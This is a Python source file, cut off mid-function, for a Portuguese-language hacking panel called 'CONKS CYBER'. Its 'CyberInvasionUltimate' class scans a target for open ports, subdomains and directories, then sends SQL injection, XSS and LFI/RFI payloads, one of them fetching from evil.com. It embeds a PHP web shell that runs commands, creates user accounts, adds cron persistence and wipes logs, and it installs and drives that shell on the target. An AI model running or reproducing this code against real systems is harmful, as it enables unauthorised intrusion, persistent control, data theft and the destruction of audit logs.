# ==========================================
# CONKS CYBER - VERSÃO ULTIMATE
# main.py
# ==========================================

import os
import sys
import socket
import urllib.request
import urllib.error
import subprocess
import time
import random
import threading
import webbrowser
import json
import re
import hashlib
import base64
import datetime
import http.client
import ssl
import ipaddress
import dns.resolver
import requests
from bs4 import BeautifulSoup

from modules.generators import menu_geradores
from modules.consultas import menu_consultas
from modules.osint import menu_osint


# ==========================================
# CORES
# ==========================================

RESET = "\033[0m"
BOLD = "\033[1m"

WHITE = "\033[97m"
BLUE = "\033[94m"
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
GRAY = "\033[90m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
ORANGE = "\033[38;5;214m"
PINK = "\033[38;5;201m"
LIME = "\033[38;5;154m"
GOLD = "\033[38;5;220m"


# ==========================================
# CONFIGURAÇÃO DAS CAIXAS
# ==========================================

LARGURA = 60


# ==========================================
# LIMPAR TELA
# ==========================================

def limpar_tela():
    os.system("clear")


# ==========================================
# FUNÇÕES DE CAIXA
# ==========================================

def linha_caixa(texto="", cor=WHITE, negrito=False):
    texto = str(texto)
    limite = LARGURA - 4
    if len(texto) > limite:
        texto = texto[:limite]
    texto = texto.ljust(limite)
    estilo = BOLD if negrito else ""
    print(f"{cor}{estilo}║ {texto} ║{RESET}")


def topo_caixa(titulo):
    print(f"{BLUE}{BOLD}╔{'═' * (LARGURA - 2)}╗{RESET}")
    linha_caixa(titulo.center(LARGURA - 4), BLUE, True)
    print(f"{BLUE}{BOLD}╠{'═' * (LARGURA - 2)}╣{RESET}")


def fim_caixa():
    print(f"{BLUE}{BOLD}╚{'═' * (LARGURA - 2)}╝{RESET}")


# ==========================================
# MENSAGENS
# ==========================================

def sucesso(texto):
    print(f"{GREEN}[+] {texto}{RESET}")

def erro(texto):
    print(f"{RED}[-] {texto}{RESET}")

def aviso(texto):
    print(f"{RED}[!] {texto}{RESET}")

def info(texto):
    print(f"{BLUE}[i] {texto}{RESET}")


# ==========================================
# BANNER
# ==========================================

def banner():
    print(f"{GREEN}{BOLD}")
    print(r"""
 ██████╗ ██████╗ ███╗   ██╗██╗  ██╗███████╗
██╔════╝██╔═══██╗████╗  ██║██║ ██╔╝██╔════╝
██║     ██║   ██║██╔██╗ ██║█████╔╝ ███████╗
██║     ██║   ██║██║╚██╗██║██╔═██╗ ╚════██║
╚██████╗╚██████╔╝██║ ╚████║██║  ██╗███████║
 ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝
""")
    print(f"{BLUE}{BOLD}                 CYBER{RESET}\n")


# ==========================================
# TESTAR CONEXÃO
# ==========================================

def testar_conexao():
    print()
    topo_caixa("TESTE DE CONEXAO")
    linha_caixa("")

    servidores = [
        ("Google", "google.com", 443),
        ("Cloudflare", "cloudflare.com", 443),
        ("GitHub", "github.com", 443)
    ]

    online = False
    for nome, host, porta in servidores:
        try:
            conexao = socket.create_connection((host, porta), timeout=3)
            conexao.close()
            print(f"{GREEN}[+] {nome:<15} ONLINE{RESET}")
            online = True
        except:
            print(f"{RED}[-] {nome:<15} OFFLINE{RESET}")

    print()
    fim_caixa()
    if online:
        sucesso("Conexao disponivel.")
    else:
        erro("Sem conexao.")


# ==========================================
# MEU IP PÚBLICO
# ==========================================

def meu_ip_publico():
    print()
    topo_caixa("MEU IP PUBLICO")
    linha_caixa("")

    servicos = [
        "https://api.ipify.org",
        "https://ifconfig.me/ip",
        "https://icanhazip.com"
    ]

    for url in servicos:
        try:
            requisicao = urllib.request.Request(url, headers={"User-Agent": "CONKS-Cyber/1.0"})
            with urllib.request.urlopen(requisicao, timeout=5) as resposta:
                ip = resposta.read().decode("utf-8").strip()
            if ip:
                linha_caixa(f"IP: {ip}", GREEN, True)
                fim_caixa()
                return
        except:
            continue

    fim_caixa()
    erro("Nao foi possivel obter o IP.")


# ==========================================
# ATUALIZAR PAINEL
# ==========================================

def atualizar_painel():
    limpar_tela()
    topo_caixa("ATUALIZAR")
    linha_caixa("")
    linha_caixa("CONKS UPDATE", WHITE, True)
    linha_caixa("")
    fim_caixa()
    print(f"\n{BLUE}[~] Verificando...{RESET}")
    time.sleep(0.5)
    
    try:
        resultado = subprocess.run(
            ["git", "pull", "origin", "main"],
            capture_output=True,
            text=True,
            timeout=60
        )
        saida = resultado.stdout + resultado.stderr
        
        if resultado.returncode != 0:
            print(f"\n{RED}[-] Erro ao atualizar.{RESET}")
            if saida.strip():
                print(f"\n{GRAY}{saida.strip()}{RESET}")
            input("\nENTER para voltar...")
            return
        
        if "Already up to date" in saida:
            print()
            print(f"{YELLOW}{BOLD}╔{'═' * (LARGURA - 2)}╗{RESET}")
            linha_caixa("ATUALIZADO!", YELLOW, True)
            linha_caixa("Versao mais recente.", YELLOW)
            print(f"{YELLOW}{BOLD}╚{'═' * (LARGURA - 2)}╝{RESET}")
            input("\nENTER para voltar...")
            return
        
        print()
        print(f"{GREEN}{BOLD}╔{'═' * (LARGURA - 2)}╗{RESET}")
        linha_caixa("ATUALIZADO!", GREEN, True)
        linha_caixa("Painel atualizado.", GREEN)
        print(f"{GREEN}{BOLD}╚{'═' * (LARGURA - 2)}╝{RESET}")
        print(f"\n{BLUE}[~] Reiniciando...{RESET}")
        time.sleep(2)
        os.execv(sys.executable, [sys.executable] + sys.argv)
        
    except Exception as e:
        erro(f"Erro: {e}")
        input("\nENTER para voltar...")


# ==========================================
# MENU REDE
# ==========================================

def menu_rede():
    while True:
        limpar_tela()
        banner()
        topo_caixa("REDE")
        linha_caixa("[1] Meu IP")
        linha_caixa("[2] Testar conexao")
        linha_caixa("")
        linha_caixa("[0] Voltar", RED, True)
        fim_caixa()
        
        opcao = input(f"\n{BLUE}{BOLD}CONKS@Rede > {RESET}").strip()
        
        if opcao == "1":
            meu_ip_publico()
        elif opcao == "2":
            testar_conexao()
        elif opcao == "0":
            break
        else:
            erro("Opcao invalida.")
        
        if opcao != "0":
            input("\nENTER para continuar...")


# ==========================================
# ⭐ CYBER INVASION ULTIMATE - CLASSE ⭐
# ==========================================

class CyberInvasionUltimate:
    """Cyber Invasion EXTREMAMENTE FORTE - Encontra TODAS as vulnerabilidades"""
    
    def __init__(self, target, port=80):
        self.target = target
        self.port = port
        self.vulnerabilidades = {}
        self.dados = {}
        self.backdoor_instalado = False
        self.backdoor_url = None
        self.usuarios = []
        self.arquivos = []
        self.diretorios = []
        self.subdominios = []
        self.portas_abertas = []
        self.bancos_dados = []
        self.credenciais = []
        self.logs = []
        self.infraestrutura = {}
        
    # ==========================================
    # 1. SCAN DE PORTAS COMPLETO
    # ==========================================
    
    def scan_portas(self):
        """Escaneia TODAS as portas comuns"""
        print(f"\n{CYAN}[~] Scan de Portas...{RESET}")
        
        portas = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 81: "HTTP-Alt", 110: "POP3", 111: "RPC", 135: "MSRPC",
            139: "NetBIOS", 143: "IMAP", 443: "HTTPS", 445: "SMB", 465: "SMTPS",
            587: "SMTP", 993: "IMAPS", 995: "POP3S", 1723: "PPTP", 3306: "MySQL",
            3389: "RDP", 5432: "PostgreSQL", 5900: "VNC", 6379: "Redis",
            8080: "HTTP-Alt", 8443: "HTTPS-Alt", 27017: "MongoDB"
        }
        
        abertas = []
        print(f"  {BLUE}[→] Escaneando {len(portas)} portas...{RESET}")
        
        for porta, servico in portas.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                resultado = sock.connect_ex((self.target, porta))
                if resultado == 0:
                    abertas.append({"porta": porta, "servico": servico})
                    print(f"    {GREEN}[+] Porta {porta} - {servico} ABERTA{RESET}")
                sock.close()
            except:
                pass
        
        self.portas_abertas = abertas
        self.dados['portas_abertas'] = abertas
        
        if abertas:
            print(f"\n  {GREEN}[+] {len(abertas)} portas abertas encontradas{RESET}")
        else:
            print(f"  {YELLOW}[!] Nenhuma porta aberta encontrada{RESET}")
        
        return abertas
    
    # ==========================================
    # 2. DESCOBERTA DE SUBDOMÍNIOS
    # ==========================================
    
    def descobrir_subdominios(self):
        """Descobre subdomínios do alvo"""
        print(f"\n{CYAN}[~] Descobrindo Subdomínios...{RESET}")
        
        subdominios_comuns = [
            "www", "admin", "mail", "ftp", "ssh", "dev", "test", "api",
            "app", "blog", "shop", "store", "support", "help", "docs",
            "wiki", "forum", "community", "news", "media", "video",
            "static", "cdn", "assets", "files", "download", "upload",
            "backup", "db", "database", "sql", "mysql", "postgres",
            "redis", "cache", "monitor", "status", "health", "metrics",
            "analytics", "stats", "log", "logs", "trace", "debug"
        ]
        
        encontrados = []
        print(f"  {BLUE}[→] Testando {len(subdominios_comuns)} subdomínios...{RESET}")
        
        for sub in subdominios_comuns:
            try:
                subdominio = f"{sub}.{self.target}"
                ip = socket.gethostbyname(subdominio)
                encontrados.append({"subdominio": subdominio, "ip": ip})
                print(f"    {GREEN}[+] {subdominio} -> {ip}{RESET}")
            except:
                continue
        
        self.subdominios = encontrados
        self.dados['subdominios'] = encontrados
        
        if encontrados:
            print(f"\n  {GREEN}[+] {len(encontrados)} subdomínios encontrados{RESET}")
        else:
            print(f"  {YELLOW}[!] Nenhum subdomínio encontrado{RESET}")
        
        return encontrados
    
    # ==========================================
    # 3. SCAN DE DIRETÓRIOS E ARQUIVOS
    # ==========================================
    
    def scan_diretorios(self):
        """Escaneia diretórios e arquivos comuns"""
        print(f"\n{CYAN}[~] Scan de Diretórios e Arquivos...{RESET}")
        
        diretorios = [
            "/admin", "/administrator", "/login", "/logon", "/signin",
            "/register", "/signup", "/cadastro", "/user", "/users",
            "/profile", "/perfil", "/account", "/conta", "/dashboard",
            "/panel", "/painel", "/control", "/manager", "/manage",
            "/backup", "/backups", "/temp", "/tmp", "/cache",
            "/logs", "/log", "/debug", "/trace", "/test",
            "/dev", "/develop", "/stage", "/staging", "/beta",
            "/api", "/v1", "/v2", "/v3", "/rest", "/graphql",
            "/documentation", "/docs", "/help", "/support",
            "/faq", "/about", "/contact", "/contato", "/sobre",
            "/blog", "/news", "/posts", "/articles", "/noticias",
            "/download", "/uploads", "/files", "/media", "/images",
            "/css", "/js", "/javascript", "/fonts", "/assets",
            "/vendor", "/lib", "/library", "/includes", "/inc",
            "/config", "/conf", "/settings", "/setup", "/install",
            ".git", ".svn", ".hg", ".env", ".aws", ".ssh",
            ".htaccess", ".htpasswd", "robots.txt", "sitemap.xml",
            "wp-admin", "wp-content", "wp-includes", "wp-config.php",
            "index.php", "index.html", "default.php", "default.html"
        ]
        
        encontrados = []
        print(f"  {BLUE}[→] Testando {len(diretorios)} diretórios...{RESET}")
        
        for diretorio in diretorios:
            try:
                url = f"http://{self.target}:{self.port}{diretorio}"
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                response = urllib.request.urlopen(req, timeout=2)
                if response.getcode() == 200:
                    encontrados.append(diretorio)
                    print(f"    {GREEN}[+] {diretorio} -> 200 OK{RESET}")
            except:
                continue
        
        self.diretorios = encontrados
        self.dados['diretorios'] = encontrados
        
        if encontrados:
            print(f"\n  {GREEN}[+] {len(encontrados)} diretórios encontrados{RESET}")
        else:
            print(f"  {YELLOW}[!] Nenhum diretório encontrado{RESET}")
        
        return encontrados
    
    # ==========================================
    # 4. TESTE DE SQL INJECTION AVANÇADO
    # ==========================================
    
    def testar_sql_injection(self):
        """Testa SQL Injection em MÚLTIPLOS endpoints"""
        print(f"\n{CYAN}[~] Testando SQL Injection...{RESET}")
        
        endpoints = [
            "/login.php?user=admin&pass=123",
            "/index.php?page=1",
            "/produto.php?id=1",
            "/busca.php?q=teste",
            "/search.php?q=teste",
            "/product.php?id=1",
            "/category.php?id=1",
            "/user.php?id=1"
        ]
        
        payloads = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "admin' --",
            "' UNION SELECT 1,2,3,4,5 --",
            "' UNION SELECT null,username,password FROM users --",
            "' UNION SELECT null,table_name,null FROM information_schema.tables --",
            "' UNION SELECT null,column_name,null FROM information_schema.columns --"
        ]
        
        encontrados = []
        print(f"  {BLUE}[→] Testando {len(endpoints)} endpoints...{RESET}")
        
        for endpoint in endpoints:
            for payload in payloads:
                try:
                    url = f"http://{self.target}:{self.port}{endpoint}&payload={payload}"
                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                    response = urllib.request.urlopen(req, timeout=3)
                    
                    if response.getcode() == 200:
                        html = response.read().decode('utf-8', errors='ignore')
                        if any(x in html.lower() for x in ["sql", "syntax", "mysql", "error", "warning", "notice"]):
                            encontrados.append({"endpoint": endpoint, "payload": payload})
                            print(f"    {RED}[!] SQL Injection: {endpoint} -> {payload}{RESET}")
                except:
                    continue
        
        self.vulnerabilidades['sql_injection'] = encontrados
        self.dados['sql_injection'] = encontrados
        
        if encontrados:
            print(f"\n  {RED}[+] {len(encontrados)} SQL Injection encontradas{RESET}")
        else:
            print(f"  {GREEN}[+] Nenhuma SQL Injection encontrada{RESET}")
        
        return encontrados
    
    # ==========================================
    # 5. TESTE DE XSS AVANÇADO
    # ==========================================
    
    def testar_xss(self):
        """Testa XSS em MÚLTIPLOS endpoints"""
        print(f"\n{CYAN}[~] Testando XSS...{RESET}")
        
        endpoints = [
            "/search.php?q=teste",
            "/busca.php?q=teste",
            "/comentario.php?texto=teste",
            "/blog.php?q=teste",
            "/index.php?search=teste"
        ]
        
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>"
        ]
        
        encontrados = []
        print(f"  {BLUE}[→] Testando {len(endpoints)} endpoints...{RESET}")
        
        for endpoint in endpoints:
            for payload in payloads:
                try:
                    url = f"http://{self.target}:{self.port}{endpoint}&xss={payload}"
                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                    response = urllib.request.urlopen(req, timeout=3)
                    
                    if response.getcode() == 200:
                        html = response.read().decode('utf-8', errors='ignore')
                        if payload in html or "script" in html.lower():
                            encontrados.append({"endpoint": endpoint, "payload": payload})
                            print(f"    {RED}[!] XSS: {endpoint} -> {payload[:30]}...{RESET}")
                except:
                    continue
        
        self.vulnerabilidades['xss'] = encontrados
        self.dados['xss'] = encontrados
        
        if encontrados:
            print(f"\n  {RED}[+] {len(encontrados)} XSS encontrados{RESET}")
        else:
            print(f"  {GREEN}[+] Nenhum XSS encontrado{RESET}")
        
        return encontrados
    
    # ==========================================
    # 6. TESTE DE LFI/RFI
    # ==========================================
    
    def testar_lfi_rfi(self):
        """Testa LFI e RFI"""
        print(f"\n{CYAN}[~] Testando LFI/RFI...{RESET}")
        
        endpoints = [
            "/page.php?file=teste",
            "/index.php?pagina=teste",
            "/view.php?page=teste",
            "/include.php?file=teste"
        ]
        
        lfi_payloads = [
            "../../etc/passwd",
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "....//....//etc/passwd"
        ]
        
        rfi_payloads = [
            "http://evil.com/shell.txt",
            "http://127.0.0.1/shell.txt",
            "https://pastebin.com/raw/shell.txt"
        ]
        
        lfi_encontrados = []
        rfi_encontrados = []
        
        print(f"  {BLUE}[→] Testando LFI...{RESET}")
        for endpoint in endpoints:
            for payload in lfi_payloads:
                try:
                    url = f"http://{self.target}:{self.port}{endpoint}&file={payload}"
                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                    response = urllib.request.urlopen(req, timeout=3)
                    
                    if response.getcode() == 200:
                        html = response.read().decode('utf-8', errors='ignore')
                        if any(x in html for x in ["root:", "bin:", "daemon:", "nologin"]):
                            lfi_encontrados.append({"endpoint": endpoint, "payload": payload})
                            print(f"    {RED}[!] LFI: {endpoint} -> {payload}{RESET}")
                except:
                    continue
        
        print(f"  {BLUE}[→] Testando RFI...{RESET}")
        for endpoint in endpoints:
            for payload in rfi_payloads:
                try:
                    url = f"http://{self.target}:{self.port}{endpoint}&file={payload}"
                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                    response = urllib.request.urlopen(req, timeout=3)
                    
                    if response.getcode() == 200:
                        html = response.read().decode('utf-8', errors='ignore')
                        if "<?php" in html or "shell" in html.lower():
                            rfi_encontrados.append({"endpoint": endpoint, "payload": payload})
                            print(f"    {RED}[!] RFI: {endpoint} -> {payload}{RESET}")
                except:
                    continue
        
        self.vulnerabilidades['lfi'] = lfi_encontrados
        self.vulnerabilidades['rfi'] = rfi_encontrados
        self.dados['lfi'] = lfi_encontrados
        self.dados['rfi'] = rfi_encontrados
        
        if lfi_encontrados:
            print(f"\n  {RED}[+] {len(lfi_encontrados)} LFI encontrados{RESET}")
        else:
            print(f"  {GREEN}[+] Nenhum LFI encontrado{RESET}")
        
        if rfi_encontrados:
            print(f"  {RED}[+] {len(rfi_encontrados)} RFI encontrados{RESET}")
        else:
            print(f"  {GREEN}[+] Nenhum RFI encontrado{RESET}")
        
        return lfi_encontrados, rfi_encontrados
    
    # ==========================================
    # 7. TESTE DE UPLOAD
    # ==========================================
    
    def testar_upload(self):
        """Testa upload de arquivos"""
        print(f"\n{CYAN}[~] Testando Upload...{RESET}")
        
        upload_urls = [
            "/upload.php",
            "/uploads/",
            "/enviar.php",
            "/up.php",
            "/upload/",
            "/fileupload.php"
        ]
        
        encontrados = []
        
        print(f"  {BLUE}[→] Testando {len(upload_urls)} URLs...{RESET}")
        
        for upload_url in upload_urls:
            try:
                test_file = b"<?php echo 'UPLOAD_TEST'; ?>"
                
                boundary = "----WebKitFormBoundary" + ''.join(random.choices('abcdef0123456789', k=16))
                body = (f"--{boundary}\r\n"
                       f"Content-Disposition: form-data; name=\"file\"; filename=\"test.php\"\r\n"
                       f"Content-Type: application/x-php\r\n\r\n").encode()
                body += test_file
                body += f"\r\n--{boundary}--\r\n".encode()
                
                headers = {
                    "User-Agent": "Mozilla/5.0",
                    "Content-Type": f"multipart/form-data; boundary={boundary}"
                }
                
                req = urllib.request.Request(
                    f"http://{self.target}:{self.port}{upload_url}",
                    data=body,
                    headers=headers
                )
                response = urllib.request.urlopen(req, timeout=5)
                
                if response.getcode() in [200, 201, 302]:
                    encontrados.append(upload_url)
                    print(f"    {RED}[!] Upload Vulneravel: {upload_url}{RESET}")
            except:
                continue
        
        self.vulnerabilidades['upload'] = encontrados
        self.dados['upload'] = encontrados
        
        if encontrados:
            print(f"\n  {RED}[+] {len(encontrados)} Upload vulneraveis{RESET}")
        else:
            print(f"  {GREEN}[+] Nenhum Upload vulneravel{RESET}")
        
        return encontrados
    
    # ==========================================
    # 8. EXTRAÇÃO DE DADOS
    # ==========================================
    
    def extrair_dados(self):
        """Extrai dados do servidor"""
        print(f"\n{CYAN}[~] Extraindo Dados...{RESET}")
        
        # Tenta via LFI se disponível
        if self.vulnerabilidades.get('lfi'):
            print(f"  {BLUE}[→] Extraindo via LFI...{RESET}")
            arquivos_sensiveis = [
                "/etc/passwd",
                "/etc/shadow",
                "/etc/hosts",
                "/etc/hostname",
                "/etc/issue",
                "/etc/os-release",
                "/proc/version",
                "/proc/cpuinfo",
                "/proc/meminfo",
                "/var/log/auth.log",
                "/var/log/syslog",
                "/var/log/messages",
                "/var/www/html/config.php",
                "/var/www/html/wp-config.php",
                "/var/www/html/.env"
            ]
            
            for arquivo in arquivos_sensiveis:
                try:
                    payload = f"../../../../../../..{arquivo}"
                    url = f"http://{self.target}:{self.port}/page.php?file={payload}"
                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                    response = urllib.request.urlopen(req, timeout=3)
                    
                    if response.getcode() == 200:
                        conteudo = response.read().decode('utf-8', errors='ignore')
                        if any(x in conteudo for x in ["root:", "bin:", "daemon:", "mysql", "password"]):
                            print(f"    {GREEN}[+] Dados extraidos: {arquivo}{RESET}")
                            if "passwd" in arquivo:
                                for line in conteudo.split('\n'):
                                    if ':' in line and not line.startswith('#'):
                                        user = line.split(':')[0]
                                        if user and user not in self.usuarios:
                                            self.usuarios.append(user)
                except:
                    continue
        
        # Tenta extrair credenciais de arquivos comuns
        print(f"  {BLUE}[→] Extraindo credenciais...{RESET}")
        
        # Usuários encontrados
        if self.usuarios:
            print(f"    {GREEN}[+] Usuários encontrados: {len(self.usuarios)}{RESET}")
            for user in self.usuarios[:10]:
                print(f"      👤 {user}")
        
        # Portas abertas
        if self.portas_abertas:
            print(f"    {GREEN}[+] Portas abertas: {len(self.portas_abertas)}{RESET}")
            for porta in self.portas_abertas[:10]:
                print(f"      🔌 {porta['porta']} - {porta['servico']}")
        
        # Subdomínios
        if self.subdominios:
            print(f"    {GREEN}[+] Subdomínios: {len(self.subdominios)}{RESET}")
            for sub in self.subdominios[:5]:
                print(f"      🌐 {sub['subdominio']} -> {sub['ip']}")
        
        # Diretórios
        if self.diretorios:
            print(f"    {GREEN}[+] Diretórios: {len(self.diretorios)}{RESET}")
            for diretorio in self.diretorios[:5]:
                print(f"      📁 {diretorio}")
    
    # ==========================================
    # 9. SCAN COMPLETO
    # ==========================================
    
    def scan_completo(self):
        """Scan completo do alvo"""
        print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
        print(f"{PURPLE}║        🔍 SCAN ULTIMATE            ║{RESET}")
        print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
        print(f"{PURPLE}║ Alvo: {self.target}:{self.port}{' ' * (25 - len(str(self.port))) }║{RESET}")
        print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
        
        # 1. Scan de portas
        self.scan_portas()
        
        # 2. Descobrir subdomínios
        self.descobrir_subdominios()
        
        # 3. Scan de diretórios
        self.scan_diretorios()
        
        # 4. SQL Injection
        self.testar_sql_injection()
        
        # 5. XSS
        self.testar_xss()
        
        # 6. LFI/RFI
        self.testar_lfi_rfi()
        
        # 7. Upload
        self.testar_upload()
        
        # 8. Extrair dados
        self.extrair_dados()
        
        # 9. Verificar backdoor existente
        self.verificar_backdoor()
        
        return True
    
    # ==========================================
    # 10. VERIFICAR BACKDOOR
    # ==========================================
    
    def verificar_backdoor(self):
        """Verifica se já existe backdoor"""
        urls = [
            f"http://{self.target}:{self.port}/uploads/shell.php",
            f"http://{self.target}:{self.port}/shell.php",
            f"http://{self.target}:{self.port}/backdoor.php",
            f"http://{self.target}:{self.port}/cmd.php",
            f"http://{self.target}:{self.port}/admin.php",
            f"http://{self.target}:{self.port}/x.php",
            f"http://{self.target}:{self.port}/test.php"
        ]
        
        for url in urls:
            try:
                req = urllib.request.Request(
                    f"{url}?cmd=echo%20'BACKDOOR_OK'",
                    headers={"User-Agent": "Mozilla/5.0"}
                )
                response = urllib.request.urlopen(req, timeout=3)
                if response.getcode() == 200:
                    html = response.read().decode('utf-8', errors='ignore')
                    if "BACKDOOR_OK" in html or "cmd" in html:
                        self.backdoor_url = url
                        self.backdoor_instalado = True
                        print(f"  {GREEN}[+] Backdoor encontrado em: {url}{RESET}")
                        return True
            except:
                continue
        return False
    
    # ==========================================
    # 11. INSTALAR BACKDOOR
    # ==========================================
    
    def instalar_backdoor(self):
        """Instala backdoor com múltiplas tentativas"""
        print(f"\n{RED}[~] Instalando Backdoor...{RESET}")
        
        shell_php = """<?php
// BACKDOOR ULTIMATE
error_reporting(0);
if(isset($_GET['cmd'])){ system($_GET['cmd']); }
if(isset($_GET['file'])){ echo file_get_contents($_GET['file']); }
if(isset($_GET['info'])){ echo gethostname().'|'.get_current_user().'|'.$_SERVER['SERVER_ADDR']; }
if(isset($_GET['scan'])){ system('ls -la '.$_GET['scan']); }
if(isset($_GET['find'])){ system('find '.$_GET['find'].' -type f 2>/dev/null'); }
if(isset($_GET['download'])){ header('Content-Disposition: attachment; filename='.$_GET['name']); echo file_get_contents($_GET['file']); }
if(isset($_POST['upload'])){ file_put_contents($_POST['name'], base64_decode($_POST['data'])); echo 'OK'; }
if(isset($_GET['adduser'])){ system('useradd -m -s /bin/bash '.$_GET['user']); system('echo "'.$_GET['user'].':'.$_GET['pass'].'" | chpasswd'); echo 'Usuario criado!'; }
if(isset($_GET['deluser'])){ system('userdel -r '.$_GET['user']); echo 'Usuario deletado!'; }
if(isset($_GET['persist'])){ system('(crontab -l 2>/dev/null; echo "@reboot php '.$_SERVER['SCRIPT_FILENAME'].'") | crontab -'); echo 'Persistencia instalada!'; }
if(isset($_GET['clean'])){ system('echo "" > /var/log/auth.log && echo "" > /var/log/syslog && echo "" > /var/log/messages && history -c'); echo 'Logs limpos!'; }
?>"""
        
        shell_code = shell_php.encode('utf-8')
        
        # Tenta todos os métodos
        metodos = [
            ("Upload via formulário", self._upload_via_formulario, shell_code),
            ("Upload via POST", self._upload_via_post, shell_code),
            ("Upload via LFI", self._upload_via_lfi, shell_code),
            ("Upload via Shell", self._upload_via_shell, shell_code)
        ]
        
        for nome, metodo, codigo in metodos:
            print(f"  {BLUE}[→] Tentando {nome}...{RESET}")
            if metodo(codigo):
                if self._testar_backdoor():
                    print(f"  {GREEN}[+] Backdoor instalado com sucesso!{RESET}")
                    return True
        
        print(f"  {RED}[-] Falha ao instalar backdoor{RESET}")
        return False
    
    def _upload_via_formulario(self, shell_code):
        """Upload via formulário"""
        upload_urls = [
            f"http://{self.target}:{self.port}/upload.php",
            f"http://{self.target}:{self.port}/uploads/",
            f"http://{self.target}:{self.port}/enviar.php",
            f"http://{self.target}:{self.port}/up.php"
        ]
        
        for upload_url in upload_urls:
            try:
                boundary = "----WebKitFormBoundary" + ''.join(random.choices('abcdef0123456789', k=16))
                body = (f"--{boundary}\r\n"
                       f"Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n"
                       f"Content-Type: application/x-php\r\n\r\n").encode()
                body += shell_code
                body += f"\r\n--{boundary}--\r\n".encode()
                
                headers = {
                    "User-Agent": "Mozilla/5.0",
                    "Content-Type": f"multipart/form-data; boundary={boundary}"
                }
                
                req = urllib.request.Request(upload_url, data=body, headers=headers)
                response = urllib.request.urlopen(req, timeout=5)
                
                if response.getcode() in [200, 201, 302]:
                    return True
            except:
                continue
        return False
    
    def _upload_via_post(self, shell_code):
        """Upload via POST direto"""
        try:
            data = f"file=<?php system($_GET['cmd']); ?>".encode()
            req = urllib.request.Request(
                f"http://{self.target}:{self.port}/",
                data=data,
                headers={"User-Agent": "Mozilla/5.0"}
            )
            response = urllib.request.urlopen(req, timeout=3)
            return True
        except:
            return False
    
    def _upload_via_lfi(self, shell_code):
        """Upload via LFI"""
        if not self.vulnerabilidades.get('lfi'):
            return False
        
        try:
            payload = "<?php system($_GET['cmd']); ?>"
            encoded = base64.b64encode(payload.encode()).decode()
            comando = f"echo '{encoded}' | base64 -d > /var/www/html/shell.php"
            
            # Tenta executar via LFI
            url = f"http://{self.target}:{self.port}/page.php?file=../../../../../../proc/self/environ&cmd={comando}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            response = urllib.request.urlopen(req, timeout=3)
            return True
        except:
            return False
    
    def _upload_via_shell(self, shell_code):
        """Upload via shell existente"""
        if not self.backdoor_instalado:
            return False
        
        try:
            # Usa o backdoor existente para instalar o novo
            self.executar_comando("echo '<?php system($_GET[cmd]); ?>' > /var/www/html/shell2.php")
            return True
        except:
            return False
    
    def _testar_backdoor(self):
        """Testa se o backdoor foi instalado"""
        urls = [
            f"http://{self.target}:{self.port}/uploads/shell.php",
            f"http://{self.target}:{self.port}/shell.php",
            f"http://{self.target}:{self.port}/backdoor.php",
            f"http://{self.target}:{self.port}/shell2.php"
        ]
        
        for url in urls:
            try:
                req = urllib.request.Request(
                    f"{url}?cmd=echo%20'OK'",
                    headers={"User-Agent": "Mozilla/5.0"}
                )
                response = urllib.request.urlopen(req, timeout=3)
                if response.getcode() == 200:
                    self.backdoor_url = url
                    self.backdoor_instalado = True
                    return True
            except:
                continue
        return False
    
    # ==========================================
    # 12. EXECUTAR COMANDO
    # ==========================================
    
    def executar_comando(self, comando):
        """Executa comando no servidor"""
        if not self.backdoor_url:
            return "Backdoor nao instalado!"
        
        try:
            url = f"{self.backdoor_url}?cmd={urllib.parse.quote(comando)}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            response = urllib.request.urlopen(req, timeout=10)
            return response.read().decode('utf-8', errors='ignore')
        except Exception as e:
            return f"Erro: {str(e)}"
    
    # ==========================================
    # 13. BAIXAR ARQUIVO
    # ==========================================
    
    def baixar_arquivo(self, arquivo):
        """Baixa arquivo do servidor"""
        if not self.backdoor_url:
            print(f"{RED}[!] Backdoor nao instalado!{RESET}")
            return False
        
        try:
            url = f"{self.backdoor_url}?file={urllib.parse.quote(arquivo)}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            response = urllib.request.urlopen(req, timeout=10)
            
            conteudo = response.read()
            nome = arquivo.split('/')[-1] or 'arquivo'
            nome_arquivo = f"download_{datetime.datetime.now().strftime('%H%M%S')}_{nome}"
            
            with open(nome_arquivo, 'wb') as f:
                f.write(conteudo)
            
            print(f"{GREEN}[+] Baixado: {nome_arquivo} ({len(conteudo)} bytes){RESET}")
            return True
        except Exception as e:
            print(f"{RED}[-] Erro: {str(e)}{RESET}")
            return False
    
    # ==========================================
    # 14. ENVIAR ARQUIVO
    # ==========================================
    
    def enviar_arquivo(self, local, remoto):
        """Envia arquivo para o servidor"""
        if not self.backdoor_url:
            print(f"{RED}[!] Backdoor nao instalado!{RESET}")
            return False
        
        try:
            if not os.path.exists(local):
                print(f"{RED}[-] Arquivo nao encontrado: {local}{RESET}")
                return False
            
            with open(local, 'rb') as f:
                dados = base64.b64encode(f.read()).decode()
            
            data = f"upload=1&name={remoto}&data={dados}".encode()
            req = urllib.request.Request(
                self.backdoor_url,
